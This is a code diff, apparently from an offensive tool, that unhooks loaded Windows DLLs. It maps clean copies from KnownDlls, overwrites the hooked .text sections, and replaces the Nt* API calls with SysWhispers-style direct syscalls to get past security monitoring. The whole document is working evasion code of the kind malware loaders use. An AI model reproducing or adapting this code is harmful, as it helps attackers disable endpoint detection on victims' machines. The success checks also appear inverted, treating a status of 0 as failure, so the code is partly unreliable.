@@ -1,5 +1,6 @@
 #include "unhook.h"
 
+
 SIZE_T					g_sTextSectionSize              = (SIZE_T) NULL;
 LPVOID					g_pLocalTxtSectionAddress       = NULL;
 LPVOID					g_pKnownDllTxtSectionAddress    = NULL;
@@ -38,12 +39,13 @@ LPVOID MapDllFromKnownDllDir(IN PWSTR szDllName)
 
     InitializeObjectAttributes(&ObjectiveAttr, &UniString, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
-    if ((STATUS = NtMapViewOfSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObjectiveAttr)) == 0)
+    if ((STATUS = Sw3NtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObjectiveAttr)) == 0)
     {
         return NULL;
     }
 
-    if ((STATUS = NtMapViewOfSection(hSection, NtCurrentProcess(), &pModule, NULL, NULL, NULL, &sViewSize, ViewUnmap, NULL, PAGE_READONLY)) == 0)
+    if ((STATUS = Sw3NtMapViewOfSection(hSection, NtCurrentProcess(), &pModule, (ULONG) NULL, (SIZE_T) NULL, NULL, &sViewSize, ViewUnmap,
+                                        (ULONG) NULL, PAGE_READONLY)) == 0)
     {
         return NULL;
     }
@@ -97,15 +99,14 @@ VOID UnhookAllLoadedDlls()
             if (!sTextSectionSize || !pLocalTxtSectionAddress || !pKnownDllTxtSectionAddress)
                 goto _CLEANUP;
 
-            if ((STATUS = NtProtectVirtualMemory(NtCurrentProcess(), &pLocalTxtSectionAddress, &sTextSectionSize, PAGE_READWRITE, &dwOldProtection)) == 0)
+            if ((STATUS = Sw3NtProtectVirtualMemory(NtCurrentProcess(), &pLocalTxtSectionAddress, &sTextSectionSize, PAGE_READWRITE, &dwOldProtection)) == 0)
             {
                 goto _CLEANUP;
             }
 
-            // Overwriting the hooked .text section with the fresh one
             memcpy(pLocalTxtSectionAddress, pKnownDllTxtSectionAddress, sTextSectionSize);
 
-            if ((STATUS = NtProtectVirtualMemory(NtCurrentProcess(), &pLocalTxtSectionAddress, &sTextSectionSize, dwOldProtection, &dwOldProtection)) == 0)
+            if ((STATUS = Sw3NtProtectVirtualMemory(NtCurrentProcess(), &pLocalTxtSectionAddress, &sTextSectionSize, dwOldProtection, &dwOldProtection)) == 0)
             {
                 goto _CLEANUP;
             }
@@ -116,7 +117,7 @@ VOID UnhookAllLoadedDlls()
         pNextEntry = pNextEntry->Flink;
         iModules++;
         if (pKnownDllCopy) {
-            NtUnmapViewOfSection(NtCurrentProcess(), pKnownDllCopy);
+            Sw3NtUnmapViewOfSection(NtCurrentProcess(), pKnownDllCopy);
         }
     }
 }
@@ -130,7 +131,7 @@ LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo)
         pExceptionInfo->ExceptionRecord->ExceptionAddress >= g_pLocalTxtSectionAddress &&
         pExceptionInfo->ExceptionRecord->ExceptionAddress <= ((ULONG_PTR)g_pLocalTxtSectionAddress + g_sTextSectionSize))
     {
-        if ((STATUS = NtProtectVirtualMemory(NtCurrentProcess(), &g_pLocalTxtSectionAddress, &g_sTextSectionSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) == 0)
+        if ((STATUS = Sw3NtProtectVirtualMemory(NtCurrentProcess(), &g_pLocalTxtSectionAddress, &g_sTextSectionSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) == 0)
         {
             goto _FAILURE;
         }
